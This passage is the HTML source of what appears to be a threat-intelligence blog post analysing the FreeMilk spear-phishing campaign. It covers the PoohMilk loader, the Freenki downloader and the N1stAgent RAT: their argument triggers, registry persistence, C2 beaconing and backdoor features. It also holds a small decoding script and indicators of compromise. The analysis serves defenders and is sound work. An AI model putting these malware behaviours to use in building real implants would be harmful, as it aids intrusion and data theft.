+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5ca5a52cd7af9965991261-1"><span class="crayon-v">E</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">BIG_POOH</span><span class="crayon-sy">\</span><span class="crayon-v">Project</span><span class="crayon-sy">\</span><span class="crayon-v">milk</span><span class="crayon-sy">\</span><span class="crayon-v">Release</span><span class="crayon-sy">\</span><span class="crayon-v">milk</span><span class="crayon-sy">.</span><span class="crayon-i">pdb</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7af9965991261-2"><span class="crayon-v">E</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">BIG_POOH</span><span class="crayon-sy">\</span><span class="crayon-v">Project</span><span class="crayon-sy">\</span><span class="crayon-v">Desktop</span><span class="crayon-sy">\</span><span class="crayon-v">milk</span><span class="crayon-sy">\</span><span class="crayon-v">Release</span><span class="crayon-sy">\</span><span class="crayon-v">milk</span><span class="crayon-sy">.</span><span class="crayon-v">pdb</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p><em>Figure 5. PDB paths found from PoohMilk samples</em>
+<p>It was observed that the threat actor consistently delivers different malware payloads together with PoohMilk loader. We assume this is an attempt to lower the chance of payload malware getting exposed to the security research community as it can hide its malicious behaviour when being analysed by automated analysis systems without the proper command line argument.
+<h2><strong>Freenki Downloader Analysis</strong></h2>
+<p>Freenki has two main purposes. The first is to collect host information and the other is to serve as a second stage downloader. Each of these will be explained in detail in the following section.
+<p>Freenki depends on the right command line argument being passed to execute any of its interesting code, if no arguments are passed it simply exits. Freenki accepts three arguments which are described below:
+<ul>
+<li><strong>console</strong> : It sets up persistence in the registry by using the current path of where the sample is being executed from and appending the parameter âhelpâ:
+<ul>
+<li>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\</li>
+<li>key name: runsample</li>
+<li>key value: â[CURRENT_EXECUTION_PATH] helpâ</li>
+</ul>
+</li>
+<li><strong>help</strong>: This argument allows the malware to execute its main function which beacons to its C2. Further details in the next section.</li>
+<li><strong>sample</strong>: This argument allows the malware to set up persistence and communicate with its C2. Synonymously as if we were to call the malware with the argument console followed by help.</li>
+</ul>
+<p>The first thing Freenki does is collect the hostâs MAC address. This is converted to a hex-string and is appended to each request to its C2. This value is likely to be used as an ID to identify the victim to the attacker. It is important to note that each request is postfix with an additional identifier followed by the MAC address. The following IDs are used and all request are made with a HTTP POST method, and between each beacon the malware sleeps for 25 seconds.
+<ul>
+<li>0x30 = Initial communication made to the C2. The malware loops over sending this initial request until the C2 responds with a HTTP OK (200) status with additional data.</li>
+<li>0x31 = This identifier is used to send host information. Below are the details collected.
+<ul>
+<li>Username</li>
+<li>ComputerName</li>
+<li>Retrieves the file version of kernel32.dll</li>
+<li>Determines whether the process is running in x64, based on the Windows API function IsWow64Process() return value</li>
+<li>Collects all Ethernet MAC addresses</li>
+<li>Attempts to perform a WMI query to get: ComputerName, Model and Manufacturer</li>
+<li>Collects all running processes</li>
+</ul>
+</li>
+</ul>
+<p>Figure 6 shows what the data looks like before encoding, more on this later
+<p><img class="alignnone size-full wp-image-44979" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3.png" alt="FreeMilk_3" width="702" height="499" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3.png 702w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3-422x300.png 422w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3-500x355.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3-56x40.png 56w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3-300x213.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_3-370x263.png 370w" sizes="(max-width: 702px) 100vw, 702px" />
+<p><em>Figure 6. Host information collected by Freenki (before encoding)</em>
+<ul>
+<li>0x34 = This identifier is used when the malware attempts to take a screenshot of the victim computer. The malware only collects a total of three screenshot before moving on.</li>
+<li>0x32 = This identifier is used to retrieve a secondary C2 server. The data is received encoded and then parsed to get the new C2 address. More on this in the secondary payload delivery section.</li>
+<li>0x33 = The malware sends this identifier prior to parsing the decoded secondary C2.</li>
+<li>0x35 = This identifier is used after it executes the secondary payload. The malware sends back the secondary C2 used to download the payload.</li>
+</ul>
+<p>The malware uses the same algorithm to decode and encode most of its data. The initial C2 and hard coded User-Agent string are encoded and can be decoded using the code snippet in Figure 7. It is not a new method, but is worth noting that Freenki uses <a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions">SSE instructions</a> to decode its data.<!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5ca5a52cd7b00274482838" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+import sys
+
+def decode_data():
+    with open(sys.argv[1], 'rb') as infile:
+        buf = bytearray(infile.read())
+ 
+    output = bytearray([((x - 0xF) ^ 0x21) &amp;amp; 0xFF for x in buf])
+ 
+    with open("decodedData.txt", 'wb') as outfile:
+        outfile.write(str(output))
+
+if __name__ == "__main__":
+    decode_data()</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-2">2</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-4">4</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-6">6</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-8">8</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-10">10</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5ca5a52cd7b00274482838-12">12</div><div class="crayon-num" data-line="crayon-5ca5a52cd7b00274482838-13">13</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-1"><span class="crayon-e">import </span><span class="crayon-e">sys</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-2">&nbsp;</div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-3"><span class="crayon-e">def </span><span class="crayon-e">decode_data</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">with </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">sys</span><span class="crayon-sy">.</span><span class="crayon-v">argv</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'rb'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">infile</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">buf</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">bytearray</span><span class="crayon-sy">(</span><span class="crayon-v">infile</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-6"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">output</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">bytearray</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">0xF</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x21</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFF</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">buf</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-8"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">with </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-s">"decodedData.txt"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wb'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">outfile</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">outfile</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-e">str</span><span class="crayon-sy">(</span><span class="crayon-v">output</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5ca5a52cd7b00274482838-12"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">__name__</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"__main__"</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5ca5a52cd7b00274482838-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">decode_data</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0007 seconds] -->
+<p><em>Figure 7.Â Python script to decode Freenkiâs encoded data</em>
+<p>We mentioned that one of the identifiers the malware uses gives it the capability to retrieve a secondary C2 address. Â A somewhat important note is the author uses the Windows API InternetOpenUrl(), therefore the secondary C2 address comes appended with either HTTP, HTTPS or FTP.Â  Using the secondary C2 address the malware attempts to download another payload. This payload is expected to be greater than 100 bytes and to begin with the ASCII values: âPNGFâ. This secondary payload has two encoding layers. One is solely used in this part of the code and the second is the same encoding discussed previously which is used throughout the malwareâs code. Once decoded, the malware writes the secondary payload to the users %temp% folder with a pseudo-random name. Then using the Windows API ShellExecuteW() and a hard-coded argument âabaiâ, the malware executes the decoded payload (Figure 8).
+<p><img class="alignnone size-full wp-image-45003" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4.png" alt="FreeMilk_4" width="754" height="310" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4.png 754w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-510x210.png 510w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-500x206.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-97x40.png 97w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-650x267.png 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-300x123.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_4-370x152.png 370w" sizes="(max-width: 754px) 100vw, 754px" />
+<p>Figure 8. Secondary payload is executed with argument âabaiâ
+<h2><strong>Links to Previous Campaigns</strong></h2>
+<p><strong>Phishing campaign disguised as Hancom update</strong>
+<p>In multiple occasions, we observed the PoohMilk loader discussed in this blog being used to load another remote administration tool we call N1stAgent (Figure 9, detailed analysis available in Appendix B).
+<table style="height: 190px;" width="699">
+<tbody>
+<tr>
+<td width="243">SHA256</td>
+<td width="61">Compile Date</td>
+<td width="92">Original File Name</td>
+<td width="54">Malware Family</td>
+</tr>
+<tr>
+<td width="243">1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027</td>
+<td width="61">2017-06-01 05:10:53</td>
+<td width="92">Windows-KB276133-x86.exe</td>
+<td width="54">N1stAgent RAT</td>
+</tr>
+<tr>
+<td width="243">ba5905c2fe46bd6734973139e759ba405fd193c2342dfcac396e9d529b57821b</td>
+<td width="61">2017-06-01 05:17:06</td>
+<td width="92">Windows-KB251952-x86.exe</td>
+<td width="54">PoohMilk Loader</td>
+</tr>
+</tbody>
+</table>
+<p><em>Figure 9: N1stAgent and PoohMilk loader set</em>
+<p>N1stAgent is not widely used and appears to be solely used in targeted attacks. It is well known for its first appearance made in the <a href="http://www.ytn.co.kr/_ln/0103_201601181932170699">phishing campaign</a> in January 2016. N1stAgent was delivered via phishing emails disguised as <a href="https://en.wikipedia.org/wiki/Hancom">Hancom</a>âs security patch.
+<p><strong>Watering hole on anti-government media website</strong>
+<p>In August 2016, visitors to an anti-government media website operated by defectors in United Kingdom were targeted by <a href="http://www.boannews.com/media/view.asp?page=&amp;gpage=&amp;idx=51580">watering hole attack</a> with CVE-2016-0189 Microsoft Internet Explorer exploit. The exploit code attempted to deliver Freenki (Figure 10) as payload malware.
+<table width="451">
+<tbody>
+<tr>
+<td width="318">SHA256</td>
+<td width="133">Download URL</td>
+</tr>
+<tr>
+<td width="318">99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5</td>
+<td width="133">http://www.ethanpublishing[.]com/ethanpublishing/phpcms/templates/default/member/pub/jquery_min_2.2.6.js</td>
+</tr>
+</tbody>
+</table>
+<p><em>Figure 10. Freenki downloaded from the watering hole incident</em>
+<h2><strong>Conclusion</strong></h2>
+<p>The FreeMilk spear phishing campaign is still ongoing, and is a campaign with a limited but wide range of targets in different regions. The threat actor tried to stay under the radar by making malware that only executes when a proper argument is given, hijacked an existing email conversation and carefully crafted each decoy document based on the hijacked conversation to make it look more legitimate. We were not able to identify the second stage malware delivered via Freenki downloader during the campaign. We did notice some C2 infrastructure overlap with other cases previously mentioned by <a href="http://blog.talosintelligence.com/2017/04/introducing-rokrat.html">TALOS</a> and a <a href="http://www.vxsecurity.sg/2016/11/22/technical-teardown-exploit-malware-in-hwp-files/">private researcher</a>. However, we are not conclusive about these connections as the C2 domains were compromised websites and there were several months between the incidents.
+<ul>
+<li>AutoFocus customers can identify this, and other samples related to it using the BigPooh, Freenki, PoohMilk and <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.N1stAgent">N1stAgent</a> tags</li>
+<li>WildFire and Traps properly classify the samples described in this report as malicious.</li>
+</ul>
+<h3><strong>Appendix A: Indicators of Compromise</strong></h3>
+<p>a50543919c52ccaea40155ce35aa791bc86bd634240fb51922827223aca5c88a
+<p>201b876bcb97f6c8972cc677bdf1e3e2b2f069ae2ec4653db8af4797884efa30
+<p>35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2
+<p>ba5905c2fe46bd6734973139e759ba405fd193c2342dfcac396e9d529b57821b
+<p>0f82ea2f92c7e906ee9ffbbd8212be6a8545b9bb0200eda09cce0ba9d7cb1313
+<p>34478d6692f8c28332751b31fd695b799d4ab36a8c12f7b728e2cb99ae2efcd9
+<p>7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54df
+<p>99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5
+<p>1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3c
+<p>1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027
+<p>ef40f7ddff404d1193e025081780e32f88883fa4dd496f4189084d772a435cb2
+<p>old.jrchina[.]com
+<p>foodforu.heliohost[.]org
+<p>www.ethanpublishing[.]com
+<p>discgolfglow[.]com
+<h3><strong>Appendix B: N1stAgent Analysis</strong></h3>
+<p>Sample properties:
+<table>
+<tbody>
+<tr>
+<td width="79">SHA256</td>
+<td width="371">1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027</td>
+</tr>
+<tr>
+<td width="79">File Name</td>
+<td width="371">Windows-KB276133-x86.exe</td>
+</tr>
+<tr>
+<td width="79">File Size</td>
+<td width="371">302,080</td>
+</tr>
+<tr>
+<td width="79">Timestamp</td>
+<td width="371">2017-06-01 05:10:53</td>
+</tr>
+<tr>
+<td width="79">Import Hash</td>
+<td width="371">3d3f31627c09d1e68647b2a66491efb3</td>
+</tr>
+<tr>
+<td width="79">PDB Path</td>
+<td width="371">F:\Backup\2nd\Agent\Release\Agent.pdb</td>
+</tr>
+</tbody>
+</table>
+<p>N1stAgent requires specific arguments to execute successfully. Some samples check only for one argument and others check for three different arguments where each one is either executing the malware, sets a startup key and runs the malware or installs the malware as a service. Service installation was not working in our found samples because the author seems to be forgotten to install the service with arguments. Here is an example of a sample which supports three arguments:
+<table>
+<tbody>
+<tr>
+<td width="56">Argument</td>
+<td width="394">Description</td>
+</tr>
+<tr>
+<td width="56">help</td>
+<td width="394">Run the malware
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="56">333</td>
+<td width="394">Add a startup method and run the malware
+<p>Key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\#
+<p>Name: Defender Update
+<p>Path: &lt;current filename&gt; help</td>
+</tr>
+<tr>
+<td width="56">usage</td>
+<td width="394">Installs itself as a service
+<p>&#8211; Display name: Windows Normai TCP?IP ICMP Service
+<p>&#8211; Service Name: icmphosts
+<p>&#8211; Description: Provides support for the ICMP over TCP/IP service and ARP name resolution for clients on the network, therefore enabling users to Network, print, and log on to the network. If this service is stopped, these functions might be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start.</td>
+</tr>
+</tbody>
+</table>
+<p><em>Figure B-1. N1stAgent supported arguments</em>
+<h3><strong>Connection to C2</strong></h3>
+<p>The agent will try to read its configuration from a file in %APPDATA% with the file extension â.DATâ. The file is encoded with simple one byte XOR and will be decoded when read. If these files do not exist on the system it will skip them and continue to connect to a configured IP address which is a web server. It will try to connect to the web server three times and each time it will send a GET request to download a file from the server which contains an additional IP address. The configuration which defines the web server information is encrypted with XOR and contains these three values:
+<ul>
+<li>Server IP address</li>
+<li>Hostname</li>
+<li>File name for the GET request</li>
+</ul>
+<p><img class="alignnone size-full wp-image-45027" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5.png" alt="FreeMilk_5" width="900" height="358" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-510x203.png 510w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-500x199.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-101x40.png 101w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-650x259.png 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-300x119.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-768x305.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-874x348.png 874w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_5-370x147.png 370w" sizes="(max-width: 900px) 100vw, 900px" />
+<p><em>Figure B-2. N1stAgent C2 connection</em>
+<p>If the connection does not work or if the server is down it will try to connect to another predefined IP address which is also stored encrypted in the binary. It will connect to the server, send its network adapter address and wait for commands from the server.
+<p>If the server responds back with the command ID 19899003 then it will contain a new IP address where the agent should connect to and then the agent will finally reveal its backdoor functionality.
+<p>The backdoor functionality supports basically 3 functions. First feature is remote shell (command âsmâ) which emulates cmd.exe on the remote host. This feature is interesting because the code is copy pasted from <a href="https://github.com/alexhenrie/wine/blob/master/programs/cmd/wcmdmain.c">Wine command program source code</a>.
+<p><img class="alignnone size-full wp-image-45051" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6.png" alt="FreeMilk_6" width="744" height="341" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6.png 744w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-510x234.png 510w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-500x229.png 500w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-87x40.png 87w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-650x298.png 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-300x138.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/10/FreeMilk_6-370x170.png 370w" sizes="(max-width: 744px) 100vw, 744px" />
+<p><em>Figure B-3. âWine Cmdâ in N1stAgent</em>
+<p>The second feature is the file manager (command âfmâ) which supports the basic file features like list-, move-, delete-, set date time-, upload- and download files.
+<p>The third feature (command âgmâ) is a function which lets the remote attacker change the configuration. For example, he can create the configuration files in %APPDATA% directory which contain additional IP addresses where the malware should connect to in future.
+            </div>
+            
+            
+          <div id="comments" class="comments-area">
+   <h2 class="comments-title mb-20">
+            Comments
+			        </h2>
+            	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/unit42-freemilk-highly-targeted-spear-phishing-campaign/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://unit42.paloaltonetworks.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+				<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name<span class="required">*</span></label><input id="author" name="author" type="text" value="" size="30" required /></p>
+<p class="comment-form-email"><label for="email">Email<span class="required">*</span></label><input id="email" name="email" type="email" value="" size="30" required /></p>
+<p class="comment-form-url"><label for="url">Website</label><input id="url" name="url" type="text" value="" size="30" /></p>
+<p id="griwpc-container-id" class="google-recaptcha-container recaptcha-align-left"><span id="griwpc-widget-id" class="g-recaptcha" data-forced="0" ></span></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='44928' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p>			</form>
+			</div><!-- #respond -->
+	 
+</div><!-- #comments -->          </div>
+          
+        </div>
+              </div>
+    </div>
+  </article>
+
+
+<section class="subscribe text-center py-60 pb-30">
+	<div class="container">
+		<div class="row justify-content-center">
+			<div class="col-sm-8">
+				<h3 class="mb-5 text-white">Get updates on Unit 42</h3>
+				<div class="page-content">
+					<p>Sign up to receive the latest news, cyber threat intelligence and research from Unit 42</p>
+				</div>
+				<div class="subscribe-form my-20">
+<form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" class="subscribe-form" name="Unit42_Subscribe">
+				<input type="hidden" value="1086" name="formid">
+		    <input type="hidden" value="531-OCS-018" name="munchkinId">
+		    <input type="hidden" value="2141" name="lpId">
+		    <input type="hidden" value="1086" name="formVid">
+		    <input type="hidden" name="mktoOptInUnit42" value="true">
+
+
+<div class="row justify-content-center">
+<div class="col-lg-8 col-md-9 col-sm-10 col-12">
+<div class="row mx-0">
+<div class="col-8 px-0">
+<input type="email" name="Email" class="subscribe-field business_email_bot rounded-left" placeholder="Email address" required>
+</div>
+<div class="col-4 px-0">
+<input type="submit" value="Subscribe" class="rounded-right">
+</div>
+</div>
+<div class="google-recapth d-none mt-15">
+<input type="hidden" class="g-recaptcha-response" name="g-recaptcha-response" value="">
+<div class="g-recaptcha" data-callback="captchaComplete" data-sitekey="6LeyHGkUAAAAAEwfqwKWxNqdht3xjSNf-j3bK7l2"></div>
+</div>
+</div>
+</div>    
+</form>
+</div>				<div class="subscribe-below"><p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
+</div>	
+				<p class="subcribe-social mt-15 text-uppercase">
+					Follow us on					<a href="https://twitter.com/Unit42_Intel" target="_blank"><i class="unit unit-10"></i></a>
+					<a href="https://github.com/pan-unit42" target="_blank"><i class="unit unit-6"></i></a>
+					<a href="http://feeds.feedburner.com/Unit42" target="_blank">
+						<svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 20 20">
+							<path d="M1.904,-0.000 C3.567,-0.000 5.168,0.215 6.707,0.646 C8.246,1.076 9.686,1.685 11.028,2.473 C12.370,3.260 13.592,4.205 14.694,5.306 C15.795,6.408 16.740,7.629 17.527,8.972 C18.315,10.314 18.924,11.754 19.354,13.293 C19.785,14.832 20.000,16.433 20.000,18.096 C20.000,18.622 19.814,19.070 19.442,19.442 C19.070,19.814 18.621,20.000 18.096,20.000 C17.571,20.000 17.123,19.814 16.751,19.442 C16.379,19.070 16.193,18.622 16.193,18.096 C16.193,16.783 16.021,15.518 15.678,14.300 C15.336,13.082 14.854,11.944 14.234,10.886 C13.614,9.829 12.870,8.866 12.002,7.998 C11.134,7.130 10.171,6.386 9.114,5.766 C8.056,5.146 6.918,4.664 5.700,4.322 C4.482,3.979 3.217,3.807 1.904,3.807 C1.379,3.807 0.930,3.621 0.558,3.249 C0.186,2.877 0.000,2.429 0.000,1.904 C0.000,1.379 0.186,0.930 0.558,0.558 C0.930,0.186 1.379,-0.000 1.904,-0.000 ZM1.904,7.199 C3.406,7.199 4.818,7.487 6.138,8.063 C7.458,8.640 8.610,9.420 9.595,10.405 C10.580,11.390 11.360,12.542 11.936,13.862 C12.513,15.182 12.801,16.594 12.801,18.096 C12.801,18.621 12.615,19.070 12.243,19.442 C11.871,19.814 11.422,20.000 10.897,20.000 C10.372,20.000 9.923,19.814 9.551,19.442 C9.179,19.070 8.993,18.621 8.993,18.096 C8.993,17.119 8.807,16.200 8.435,15.339 C8.063,14.479 7.556,13.727 6.915,13.085 C6.273,12.443 5.521,11.937 4.661,11.565 C3.800,11.193 2.881,11.007 1.904,11.007 C1.379,11.007 0.930,10.821 0.558,10.449 C0.186,10.077 -0.000,9.628 -0.000,9.103 C-0.000,8.578 0.186,8.129 0.558,7.757 C0.930,7.385 1.379,7.199 1.904,7.199 ZM5.405,17.199 C5.405,17.578 5.335,17.929 5.197,18.249 C5.058,18.571 4.869,18.851 4.628,19.092 C4.387,19.333 4.103,19.522 3.775,19.661 C3.446,19.799 3.100,19.869 2.735,19.869 